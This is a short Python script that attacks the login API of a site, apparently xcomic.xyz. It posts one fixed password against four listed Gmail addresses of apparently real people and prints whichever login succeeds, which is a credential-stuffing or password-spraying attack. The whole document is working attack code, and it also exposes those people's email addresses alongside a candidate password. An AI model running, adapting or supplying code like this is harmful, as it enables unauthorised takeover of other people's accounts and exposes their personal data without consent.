import requests

url = 'https://xcomic.xyz/api/auth/token'
passwords = ['76008972']
emails = ['zonemrahman@gmail.com', 'monemrahman@gmail.com', 'mzisan367@gmail.com', 'terapkco@gmail.com']

for email in emails:
    for password in passwords:
        data = {'username': email, 'password': password}
        res = requests.post(url, data=data)
        if res.status_code == 200:
            print(f'Login successful for {email}!')
            exit(0)
print('All login attempts failed.')
